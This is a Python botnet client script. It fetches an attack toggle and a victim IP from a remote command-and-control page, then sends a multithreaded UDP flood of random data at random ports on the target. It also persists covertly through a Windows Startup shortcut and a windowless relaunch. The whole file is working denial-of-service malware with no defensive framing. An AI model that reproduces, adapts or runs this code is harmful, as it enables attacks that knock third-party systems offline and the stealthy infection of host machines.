import os
import sys
import threading
import random
import socket
import requests
import re
import time
import subprocess

try:
    import psutil
    import win32com.client
except ImportError:
    print("You need to install 'psutil' and 'pywin32'. Run 'pip install psutil pywin32'.")

num_bots = 10
running = True
data_limit = 1 * 1024**4
attack_type = "VOLUMETRIC"

previous_note_content = ""
previous_victim_ip = ""

def fetch_target_ip():
    try:
        response = requests.get("https://rsc-site.neocities.org/victim")
        ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", response.text)
        if ip_address:
            print(f"Target IP obtained: {ip_address[0]}")
            return ip_address[0]
        else:
            print("No valid IP found at the target URL.")
            return None
    except Exception as e:
        print("Error fetching target IP:", e)
        return None

def is_attack_enabled():
    try:
        response = requests.get("https://rsc-site.neocities.org/note")
        enabled = "true" in response.text.lower()
        print(f"Attack enabled status: {enabled}")
        return enabled
    except Exception as e:
        print("Error checking attack enabled status:", e)
        return False

def attack(bot_id, target_ip, packet_size=10240):
    total_data_sent = 0
    global running
    print(f"Bot {bot_id} initiating attack on {target_ip}")
    
    while total_data_sent < data_limit and running:
        try:
            if attack_type == "VOLUMETRIC":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    packet = random._urandom(packet_size)
                    random_port = random.randint(1, 65535)
                    s.sendto(packet, (target_ip, random_port))
                    total_data_sent += len(packet)
        except Exception as e:
            print(f"Bot {bot_id}: Error -", e)

def run_attack():
    global previous_note_content, previous_victim_ip
    while True:
        try:
            current_attack_enabled = is_attack_enabled()
            current_victim_ip = fetch_target_ip()

            if current_attack_enabled and current_victim_ip:
                if current_victim_ip != previous_victim_ip or current_attack_enabled != (previous_note_content == "true"):
                    previous_note_content = "true" if current_attack_enabled else "false"
                    previous_victim_ip = current_victim_ip
                    
                    print("Initiating attack due to detected changes.")
                    threads = []
                    for i in range(num_bots):
                        bot_thread = threading.Thread(target=attack, args=(i, current_victim_ip))
                        threads.append(bot_thread)
                        bot_thread.start()

                    for thread in threads:
                        thread.join()
                else:
                    print("Conditions met but no changes since the last run.")
            else:
                print("Conditions not met for attack (attack not enabled or no target IP).")
            time.sleep(63)
        except Exception as e:
            print("Error during URL check or attack execution:", e)

def is_running_in_background():
    current_pid = os.getpid()
    for process in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if process.info['pid'] != current_pid and process.info['cmdline'] and os.path.abspath(__file__) in process.info['cmdline']:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def run_with_pythonw():
    if sys.platform == "win32" and "python.exe" in sys.executable:
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, os.path.abspath(__file__)])
        sys.exit()

def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')

    if os.path.exists(shortcut_path):
        print("The program is already set to start automatically.")
        return

    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = script_path
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()
        print("The program has been set to start automatically.")
    except Exception as e:
        print("Error adding the program to startup:", e)

if __name__ == "__main__":
    add_to_startup()

    run_with_pythonw()

    if not is_running_in_background():
        run_attack()
    else:
        print("The script is already running in the background.")

